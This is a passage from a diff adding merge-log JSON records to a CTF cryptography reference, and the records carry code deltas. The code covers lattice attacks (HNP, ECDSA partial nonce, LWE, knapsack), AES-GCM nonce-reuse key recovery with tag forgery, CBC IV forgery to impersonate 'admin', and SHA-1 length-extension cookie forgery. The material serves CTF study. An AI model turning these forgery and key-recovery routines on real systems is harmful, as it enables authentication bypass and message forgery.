+    "source": "ctf-crypto/exotic-crypto.md",
+    "heading": "## GhostBlood \u2014 Faulty ChaCha ARX Rotate (BSidesSF 2026)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Core Tools: LLL, BKZ, Babai, CVP, SVP (ASIS CTF Finals 2015, CTFZone 2017)",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,3 +1,5 @@\n\n ## Core Tools: LLL, BKZ, Babai, CVP, SVP (ASIS CTF Finals 2015, CTFZone 2017)\n+\n+> Pure-Python stack: `fpylll` for `IntegerMatrix`/`LLL`/`BKZ`/`CVP`, `sympy` for `Matrix`/`Poly` over `GF(p)`.\n \n ### LLL\n@@ -13,4 +15,14 @@\n\n \n ```python\n+from fpylll import IntegerMatrix, LLL\n+\n+M = IntegerMatrix.from_matrix(basis_rows)\n+LLL.reduction(M)\n+print(list(M[0]))\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import Matrix, ZZ\n \n@@ -19,4 +31,6 @@\n\n print(R[0])\n ```\n+\n+</details>\n \n ### BKZ\n@@ -29,6 +43,18 @@\n\n \n ```python\n+from fpylll import BKZ\n+\n+# M is an IntegerMatrix (from LLL example above)\n+BKZ.reduction(M, BKZ.Param(block_size=25))\n+# ponytail: fpylll LLL only, BKZ if >50 dims\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n R = M.BKZ(block_size=25)\n ```\n+\n+</details>\n \n ### Babai nearest plane\n@@ -41,8 +67,9 @@\n\n \n ```python\n-from fpylll import IntegerMatrix, CVP\n+from fpylll import IntegerMatrix, LLL, CVP\n \n-# After building and reducing the lattice basis:\n-closest = CVP.babai(B, target)\n+# After building and reducing the lattice basis B (IntegerMatrix):\n+# LLL.reduction(B)\n+closest = CVP.closest_vector(B, target)\n ```\n "
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Hidden Number Problem (HNP): Partial Nonce / Biased Nonce (nullcon HackIM 2020, Ledger Donjon CTF 2020)",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -37,4 +37,22 @@\n\n \n ```python\n+from fpylll import IntegerMatrix\n+\n+def build_hnp_lattice(q, coeffs, bounds):\n+    n = len(coeffs)\n+    rows = []\n+    for i in range(n):\n+        row = [0] * (n + 1)\n+        row[i] = q\n+        rows.append(row)\n+\n+    last = [c for c in coeffs] + [bounds]\n+    rows.append(last)\n+    return IntegerMatrix.from_matrix(rows)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import Matrix, ZZ\n \n@@ -51,4 +69,6 @@\n\n     return Matrix(ZZ, rows)\n ```\n+\n+</details>\n \n **Key insight:** HNP attacks usually do not require a perfect lattice model. In CTFs, once the true secret produces a vector much shorter than random noise, `LLL` often exposes it directly or gets you close enough to brute-force the last few bits.\n@@ -78,4 +98,22 @@\n\n \n ```python\n+from fpylll import IntegerMatrix\n+\n+def build_ecdsa_partial_nonce_lattice(q, rs, ss, hs, leaked, t):\n+    n = len(rs)\n+    rows = [[0] * (n + 2) for _ in range(n + 2)]\n+    for i in range(n):\n+        rows[i][i] = q\n+    for i in range(n):\n+        rows[n][i] = int(ss[i] % q)\n+        rows[n + 1][i] = int((hs[i] - ss[i] * leaked[i] * (1 << t)) % q)\n+    rows[n][n] = 1\n+    rows[n + 1][n + 1] = q // (1 << t)\n+    return IntegerMatrix.from_matrix(rows)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import Matrix, ZZ\n \n@@ -96,4 +134,6 @@\n\n ```\n \n+</details>\n+\n What to do next:\n "
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## LCG and Truncated Output as a Lattice Problem (X-MAS CTF 2018, FwordCTF 2020)",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -58,4 +58,21 @@\n\n \n ```python\n+from fpylll import IntegerMatrix\n+\n+def build_truncated_lcg_lattice(m, a, b, ys, t):\n+    n = len(ys) - 1\n+    rows = [[0] * (n + 1) for _ in range(n + 1)]\n+    for i in range(n):\n+        rows[i][i] = m\n+    for i in range(n):\n+        rhs = (a * ys[i] * (1 << t) + b - ys[i + 1] * (1 << t)) % m\n+        rows[n][i] = int(rhs)\n+    rows[n][n] = 1 << t\n+    return IntegerMatrix.from_matrix(rows)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import Matrix, ZZ\n \n@@ -75,4 +92,6 @@\n\n ```\n \n+</details>\n+\n What to do next:\n "
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## LWE via Embedding and CVP (PlaidCTF 2016, Aero CTF 2020)",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -22,4 +22,30 @@\n\n \n ```python\n+from fpylll import IntegerMatrix\n+\n+def lwe_embedding(A, q):\n+    # A: m x n as list-of-lists or IntegerMatrix; returns (m+n) x (m+n) IntegerMatrix\n+    if hasattr(A, \"nrows\"):\n+        # IntegerMatrix / Sage matrix -> convert to list-of-lists\n+        m, n = A.nrows, A.ncols\n+        A_list = [[int(A[i, j]) for j in range(n)] for i in range(m)]\n+    else:\n+        A_list = A\n+        m, n = len(A_list), len(A_list[0]) if A_list else (0, 0)\n+    dim = m + n\n+    rows = [[0] * dim for _ in range(dim)]\n+    for i in range(m):\n+        rows[i][i] = q\n+    # bottom block: [A^T | I_n]\n+    for j in range(n):\n+        for i in range(m):\n+            rows[m + j][i] = int(A_list[i][j])\n+        rows[m + j][m + j] = 1\n+    return IntegerMatrix.from_matrix(rows)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import Matrix, ZZ, identity_matrix, zero_matrix, block_matrix\n \n@@ -30,4 +56,6 @@\n\n     return block_matrix([[top], [bottom]])\n ```\n+\n+</details>\n \n Then:"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Ring-LWE / Module-LWE Recognition Notes (PlaidCTF 2016, DiceCTF 2022)",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -25,4 +25,25 @@\n\n \n ```python\n+from fpylll import IntegerMatrix\n+\n+def ring_lwe_to_matrix(a_poly, n, q):\n+    \"\"\"Flatten a(x) in Z_q[x]/(x^n+1) to its negacyclic rotation matrix.\"\"\"\n+    coeffs = list(a_poly) + [0] * (n - len(list(a_poly)))\n+    rows = []\n+    for i in range(n):\n+        row = [0] * n\n+        for j in range(n):\n+            # negacyclic: x^n = -1\n+            if j <= i:\n+                row[j] = int(coeffs[i - j] % q)\n+            else:\n+                row[j] = int((-coeffs[n + i - j]) % q)\n+        rows.append(row)\n+    return IntegerMatrix.from_matrix(rows)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import Matrix, ZZ, vector\n \n@@ -43,6 +64,8 @@\n\n         rows.append(row)\n     return Matrix(ZZ, rows)\n+```\n+\n+</details>\n # After flattening, treat as plain LWE: b_vec = A_mat * s_vec + e_vec (mod q)\n-```\n \n **Key insight:** most Ring-LWE / Module-LWE CTF challenges are weakened by implementation mistakes, tiny errors, or over-structured secrets. Flatten to plain LWE first and check whether standard lattice tools solve it before pursuing ring-specific attacks."
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Orthogonal Lattices: HSSP / AHSSP Style Recovery (zer0pts CTF 2022)",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -16,4 +16,36 @@\n\n 4. take the kernel / orthogonal complement\n 5. reduce again to expose the hidden binary or short basis\n+\n+```python\n+from fpylll import IntegerMatrix, LLL\n+\n+def orthogonal_lattice_recovery(H, M):\n+    \"\"\"Recover hidden binary basis from h = alpha * A (mod M).\n+\n+    H: observed matrix (k x n) over Z_M as list-of-lists or IntegerMatrix\n+    M: modulus\n+    Returns: LLL-reduced orthogonal lattice whose kernel reveals A.\n+    \"\"\"\n+    if hasattr(H, \"nrows\"):\n+        k, n = H.nrows, H.ncols\n+        H_list = [[int(H[i, j] % M) for j in range(n)] for i in range(k)]\n+    else:\n+        H_list = H\n+        k, n = len(H_list), len(H_list[0]) if H_list else (0, 0)\n+    dim = k + n\n+    rows = [[0] * dim for _ in range(dim)]\n+    for i in range(k):\n+        rows[i][i] = M\n+    for j in range(n):\n+        for i in range(k):\n+            rows[k + j][i] = int(H_list[i][j] % M)\n+        rows[k + j][k + j] = 1\n+    L = IntegerMatrix.from_matrix(rows)\n+    LLL.reduction(L)\n+    # Short rows in the bottom-right block are orthogonal to the hidden basis\n+    return L\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -37,4 +69,6 @@\n\n ```\n \n+</details>\n+\n **When to use:**\n "
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Subset Sum / Knapsack via Lattice Reduction (HITCON CTF 2017, BackdoorCTF 2023)",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -16,4 +16,19 @@\n\n \n ```python\n+from fpylll import IntegerMatrix\n+\n+def knapsack_lattice(weights, target):\n+    n = len(weights)\n+    rows = [[0] * (n + 1) for _ in range(n + 1)]\n+    for i in range(n):\n+        rows[i][i] = 1\n+        rows[i][n] = int(weights[i])\n+    rows[n][n] = int(-target)\n+    return IntegerMatrix.from_matrix(rows)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import Matrix, ZZ\n \n@@ -28,4 +43,6 @@\n\n ```\n \n+</details>\n+\n Then:\n "
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## NTRU Lattice Recovery (G1) -- NTRU / NTRU Prime / Kyber Flattening",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## GGH Embedding / CVP Closest Vector (G2)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Mersenne AJPS / MLHRSP Small Roots (G3) -- p = 2^n -1",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## BDD Predicate / LadderLeak -- Below HNP (G6/G17)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Module-LWE / ML-KEM & Estimator -- Moved to post-quantum.md",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Common Failure Modes",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,4 +1,3 @@\n\n ## Common Failure Modes\n-\n - **Wrong scaling:** one coordinate dominates the basis and hides the short vector.\n - **Wrong centering:** values should be mapped to `[-q/2, q/2]`, not kept in `[0, q)`.\n@@ -8,5 +7,3 @@\n\n - **Mistaken problem type:** what looks like LWE may actually be plain linear algebra, CRT, or a bugged encoding problem.\n - **Forgot brute-force finish:** lattice often gets you \"almost correct\"; the last few bits or signs may still need a tiny brute force.\n-\n ---\n-"
+  },
+  {
+    "source": "ctf-crypto/lattice-and-lwe.md",
+    "heading": "## Quick Checklist Before You Commit to Lattices",
+    "destination": "ctf-crypto/lattice-and-lwe.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,4 +1,3 @@\n\n ## Quick Checklist Before You Commit to Lattices\n-\n - Can I write the unknown as \"small secret\" or \"small error\"?\n - Is there a bounded term that should make one vector much shorter than random?\n@@ -8,4 +7,3 @@\n\n - If `LLL` almost works, did I try `BKZ` or Babai?\n - If the instance is polynomial-based, did I first flatten it into coefficient vectors?\n-\n If most answers are \"yes\", the challenge is very likely meant to be solved with lattice reduction."
+  },
+  {
+    "source": "ctf-crypto/modern-ciphers-2.md",
+    "heading": "## SHA-1 Length Extension Plus AES-CBC Cookie Forgery (BSidesSF 2019)",
+    "destination": "ctf-crypto/modern-ciphers-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -6,4 +6,5 @@\n\n import hashpumpy, binascii, base64, urllib\n from Crypto.Cipher import AES\n+from Crypto.Util.Padding import pad, unpad\n \n # Extract AES key from leaked rack.session cookie\n@@ -12,6 +13,6 @@\n\n iv, ct = user[:16], user[16:]\n \n-def decrypt(c): return AES.new(key, AES.MODE_CBC, iv).decrypt(c).rstrip(b'\\x10\\x0f\\x0e...')\n-def encrypt(p): pad = 16 - len(p) % 16; return AES.new(key, AES.MODE_CBC, iv).encrypt(p + bytes([pad])*pad)\n+def decrypt(c): return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(c), 16)\n+def encrypt(p): return AES.new(key, AES.MODE_CBC, iv).encrypt(pad(p, 16))\n \n # Length-extend signature (secret length guessed = 8)"
+  },
+  {
+    "source": "ctf-crypto/modern-ciphers-3.md",
+    "heading": "## CBC IV Forgery + Block Truncation for Authentication Bypass (0CTF 2017)",
+    "destination": "ctf-crypto/modern-ciphers-3.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,10 +1,12 @@\n\n ## CBC IV Forgery + Block Truncation for Authentication Bypass (0CTF 2017)\n \n-**Pattern:** Service encrypts `MD5(padded_name) || padded_name` with AES-CBC. The MD5 serves as an integrity check on login. Two attacks combine: (1) IV manipulation: XOR IV bytes to change the decrypted first block from the source MD5 to the target MD5. (2) Block truncation: register with `pad(\"admin\") + 16_junk_bytes`, then strip trailing ciphertext blocks \u2014 AES-CBC has no length field, so shorter ciphertext decrypts validly if PKCS7 padding is correct.\n+**Pattern:** Service encrypts `MD5(padded_name) || padded_name` with AES-CBC. The MD5 serves as an integrity check on login. Two attacks combine: (1) IV manipulation: XOR IV bytes to change the decrypted first block from the source MD5 to the target MD5. (2) Block truncation: register with `pad(b\"admin\", 16) + 16_junk_bytes`, then strip trailing ciphertext blocks \u2014 AES-CBC has no length field, so shorter ciphertext decrypts validly if PKCS7 padding is correct.\n \n ```python\n+from Crypto.Util.Padding import pad\n+\n # Forge IV to flip MD5 from registered user to \"admin\"\n-source_md5 = md5(pad(\"admin\") + b\"A\"*16)\n-target_md5 = md5(pad(\"admin\"))\n+source_md5 = md5(pad(b\"admin\", 16) + b\"A\"*16)\n+target_md5 = md5(pad(b\"admin\", 16))\n new_iv = bytes(a ^ b ^ c for a, b, c in zip(original_iv, source_md5, target_md5))\n "
+  },
+  {
+    "source": "ctf-crypto/modern-ciphers-3.md",
+    "heading": "## SHA-256 Basis Attack for XOR-Aggregate Hash Bypass (34C3 CTF 2017)",
+    "destination": "ctf-crypto/modern-ciphers-3.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,21 @@\n\n \n **Pattern:** Find 256 files whose SHA-256 hashes form a basis for Z_2^256. Then for any target hash, compute which subset of basis files XORs to produce the desired hash difference. This breaks systems that verify integrity via `XOR(sha256(file_i)) == expected`.\n+\n+```python\n+# 1. Generate ~300 random valid Python files\n+# 2. Compute SHA-256 of each -> 256-bit vectors over GF(2)\n+# 3. Gaussian elimination to find 256 linearly independent vectors\n+# 4. Target: h_new XOR (XOR of sha256(basis_files)) = h_orig\n+# 5. Solve the linear system to find which basis files to include\n+from sympy import Matrix\n+\n+M = Matrix([hash_to_bits(sha256(f)) for f in basis_files])\n+target = Matrix([hash_to_bits(sha256(malicious_zip))[i] ^ hash_to_bits(original_hash)[i] for i in range(256)])\n+# Solve M^T * x = target over GF(2) (solve_left => x*M = target => M^T*x = target)\n+solution = M.T.gauss_jordan_solve(target)  # reduce mod 2; or use rref iszerofunc\n+# For GF(2), reduce entries mod 2 after rref\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -15,4 +32,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** SHA-256 hashes are 256-bit vectors over GF(2). Given ~256 random hashes, they almost certainly span the full space, meaning you can XOR-combine them to produce any target 256-bit value. This breaks XOR-based aggregate hash verification: if the system checks `XOR(sha256(file_i)) == expected`, you can replace files while maintaining the aggregate. The attack does NOT find SHA-256 collisions -- it exploits the linearity of XOR aggregation over non-linear hash outputs.\n \n@@ -41,8 +60,10 @@\n\n \n ```python\n+from Crypto.Util.number import long_to_bytes\n+\n key_hash = get_digest(b'\\x00')  # sha256(key + 0) = sha256(key)\n key = 0\n for i in range(key_bits):\n-    digest = get_digest(int_to_bytes(2**i))\n+    digest = get_digest(long_to_bytes(2**i))\n     if digest == key_hash:\n         key |= (1 << i)  # bit i is set in key\n@@ -96,8 +117,53 @@\n\n \n ```python\n+from sympy import Matrix\n+\n+A = Matrix(A_rows)\n+b_vec = Matrix(b)\n+# Solve A * key = b over GF(p)\n+# Use sympy rref with modulus p (prime)\n+# Convert to field via mod p\n+p_inv = p  # modulus\n+# Gauss-Jordan mod p helper\n+def solve_mod(A, b, mod):\n+    aug = A.row_join(b)\n+    # rref over integers then reduce mod; sympy handles rational but mod p needs custom\n+    # Use sympy's rref then mod, or manual elimination\n+    n = A.cols\n+    # Use manual GF(p) elimination\n+    M = [[int(A[i,j] % mod) for j in range(n)] + [int(b[i] % mod)] for i in range(A.rows)]\n+    # forward elimination\n+    row = 0\n+    sol = [0]*n\n+    where = [-1]*n\n+    for col in range(n):\n+        sel = next((i for i in range(row, len(M)) if M[i][col] % mod != 0), None)\n+        if sel is None: continue\n+        M[row], M[sel] = M[sel], M[row]\n+        where[col]=row\n+        inv = pow(M[row][col], -1, mod)\n+        M[row]=[(x*inv)%mod for x in M[row]]\n+        for i in range(len(M)):\n+            if i!=row and M[i][col]!=0:\n+                f=M[i][col]\n+                M[i]=[(M[i][j]-f*M[row][j])%mod for j in range(n+1)]\n+        row+=1\n+    for i in range(n):\n+        if where[i]!=-1:\n+            sol[i]=M[where[i]][n]\n+    return Matrix(sol)\n+\n+key = solve_mod(A, b_vec, p)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n from sage.all import matrix, GF\n A = matrix(GF(p), 40, A_rows)\n key = A.solve_right(vector(GF(p), b))\n ```\n+\n+</details>\n \n Use `tshark -r file.pcap -Y 'data.len>0' -T fields -e data` to dump the packet bytes, parse into rows, feed to Sage."
+  },
+  {
+    "source": "ctf-crypto/modern-ciphers-4.md",
+    "destination": "ctf-crypto/modern-ciphers-4.md",
+    "decision": "imported",
+    "reason": "New upstream reference; reviewed and boundary-gated"
+  },
+  {
+    "source": "ctf-crypto/modern-ciphers.md",
+    "heading": "## AES-GCM with Derived Keys (EHAX 2026)",
+    "destination": "ctf-crypto/modern-ciphers.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -5,5 +5,5 @@\n\n ```python\n import hashlib\n-from Cryptodome.Cipher import AES\n+from Crypto.Cipher import AES\n \n # Common key derivation chain:"
+  },
+  {
+    "source": "ctf-crypto/modern-ciphers.md",
+    "heading": "## AES-GCM Nonce Reuse / Forbidden Attack",
+    "destination": "ctf-crypto/modern-ciphers.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -6,4 +6,67 @@\n\n \n **GHASH authentication key recovery:** The authentication tag is a polynomial evaluation over GF(2^128). Two messages with the same nonce produce two equations in the same authentication key H. XOR the tag polynomials and factor over GF(2^128) to recover H. With H, forge valid tags for arbitrary messages.\n+\n+```python\n+from Crypto.Cipher import AES\n+# Pure-Python GHASH over GF(2^128) using pycryptodome / galois\n+# GHASH is polynomial evaluation; use galois or manual GF(2^128) arithmetic\n+\n+def xor(a, b): return bytes(x ^ y for x, y in zip(a, b))\n+\n+# Given: two (ciphertext, tag, nonce) pairs with same nonce\n+# Step 1: Recover plaintext via CTR keystream reuse\n+keystream = xor(known_plaintext, ciphertext1)\n+plaintext2 = xor(keystream, ciphertext2)\n+\n+# Step 2: Recover GHASH auth key H\n+# GHASH(H, aad, ciphertext) = sum blocks * H^{n-i+1} over GF(2^128).\n+# Long messages: pip install galois + factor P(H)=T1-T2-GHASH_diff(H),\n+# or use nonce-disrespect tool. 1-block case below needs nothing else:\n+# verified end-to-end against real AES-GCM (forge passes decrypt_and_verify).\n+_MASK128 = (1 << 128) - 1\n+\n+def gmul(x, y):\n+    \"\"\"GF(2^128) multiply, NIST SP 800-38D Alg.1. Ints are big-endian blocks.\"\"\"\n+    z, v = 0, y & _MASK128\n+    for i in range(128):\n+        if (x >> (127 - i)) & 1:\n+            z ^= v\n+        lsb = v & 1\n+        v >>= 1\n+        if lsb:\n+            v ^= 0xE1000000000000000000000000000000\n+    return z & _MASK128\n+\n+def _gpow(a, e):\n+    r = 1 << 127  # field identity in this encoding\n+    while e:\n+        if e & 1:\n+            r = gmul(r, a)\n+        a = gmul(a, a)\n+        e >>= 1\n+    return r\n+\n+def ginv(a):\n+    return _gpow(a, (1 << 128) - 2)  # Fermat, single-primitive\n+\n+def _gsqrt(a):\n+    for _ in range(127):  # a^(2^127): sqrt in char 2, single-primitive\n+        a = gmul(a, a)\n+    return a\n+\n+# 1-block empty-AAD: GHASH = ((C*H) ^ L)*H with L = 128-bit length block,\n+# so T1 ^ T2 = (C1 ^ C2)*H^2 -- quadratic, solve H^2 then sqrt.\n+def ghash_recover_h_1block(c1, c2, t1, t2):\n+    d = (int.from_bytes(c1, \"big\") ^ int.from_bytes(c2, \"big\")) & _MASK128\n+    t = (int.from_bytes(t1, \"big\") ^ int.from_bytes(t2, \"big\")) & _MASK128\n+    if d == 0:\n+        raise ValueError(\"ciphertexts identical -- need distinct blocks\")\n+    return _gsqrt(gmul(t, ginv(d)))  # H as int; verify by recomputing tag\n+\n+# Step 3: Forge tags for arbitrary messages\n+# GHASH(H, aad, ciphertext) computed with recovered H\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -27,4 +90,6 @@\n\n ```\n \n+</details>\n+\n **Tool:** [nonce-disrespect](https://github.com/nonce-disrespect/nonce-disrespect) automates GHASH key recovery and tag forgery from nonce-reused GCM ciphertexts.\n "
+  },
+  {
+    "source": "ctf-crypto/prng.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-crypto/prng.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -15,4 +15,8 @@\n\n - [Logistic Map / Chaotic PRNG Seed Recovery (BYPASS CTF 2025)](#logistic-map--chaotic-prng-seed-recovery-bypass-ctf-2025)\n - [V8 XorShift128+ State Recovery (Math.random Prediction)](#v8-xorshift128-state-recovery-mathrandom-prediction)\n+- [PCG Family \u2014 Permuted Congruential Generator (XSH-RR / XSL-RR / DXSM)](#pcg-family--permuted-congruential-generator-xsh-rr--xsl-rr--dxsm)\n+- [xoroshiro / xoshiro Family \u2014 Constants & Scramblers](#xoroshiro--xoshiro-family--constants--scramblers)\n+- [Blum-Blum-Shub (BBS) \u2014 LSB Hardness & Parity Trap](#blum-blum-shub-bbs--lsb-hardness--parity-trap)\n+- [Chaotic Maps \u2014 Henon & Arnold Cat Map (Image Scrambling)](#chaotic-maps--henon--arnold-cat-map-image-scrambling)\n \n See [prng-attacks.md](prng-attacks.md) for CTF-era advanced attacks (2017+)."
+  },
+  {
+    "source": "ctf-crypto/prng.md",
+    "heading": "## Password Cracking Strategy",
+    "destination": "ctf-crypto/prng.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -43,3 +43,2 @@\n\n ---\n \n-See [prng-attacks.md](prng-attacks.md) for CTF-era advanced attacks (2017+)."
+  },
+  {
+    "source": "ctf-crypto/prng.md",
+    "heading": "## PCG Family \u2014 Permuted Congruential Generator (XSH-RR / XSL-RR / DXSM)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/prng.md",
+    "heading": "## xoroshiro / xoshiro Family \u2014 Constants & Scramblers",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/prng.md",
+    "heading": "## Blum-Blum-Shub (BBS) \u2014 LSB Hardness & Parity Trap",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/prng.md",
+    "heading": "## Chaotic Maps \u2014 Henon & Arnold Cat Map (Image Scrambling)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## RSA Cube Root CRT when gcd(e, phi) > 1 (BearCatCTF 2026)",
+    "destination": "ctf-crypto/rsa-attacks-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -7,4 +7,5 @@\n\n from sympy.ntheory.residues import nthroot_mod\n from sympy.ntheory.modular import crt\n+from Crypto.Util.number import long_to_bytes\n \n primes = [p1, p2, ..., p13]  # All \u2261 1 mod 3"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## RSA with gcd(e, phi(n)) > 1 (CSAW 2015)",
+    "destination": "ctf-crypto/rsa-attacks-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -9,4 +9,5 @@\n\n \n ```python\n+from math import gcd\n from sympy import factorint, mod_inverse\n from gmpy2 import iroot"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## Batch GCD for Shared Prime Factoring (BSidesSF 2025)",
+    "destination": "ctf-crypto/rsa-attacks-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,11 +4,10 @@\n\n \n ```python\n-from math import gcd\n-from functools import reduce\n+from math import gcd, prod\n \n def batch_gcd(moduli):\n     \"\"\"Find shared factors among a list of RSA moduli\"\"\"\n-    # Product tree\n-    product = reduce(lambda a, b: a * b, moduli)\n+    # Product tree via math.prod\n+    product = prod(moduli)\n \n     factors = {}"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## Implicit Factoring via Shared LSB/MSB \u2014 Implicit Factoring (Implicit factoring)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## RSA Partial Key Recovery from dp dq qinv (0CTF 2016)",
+    "destination": "ctf-crypto/rsa-attacks-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
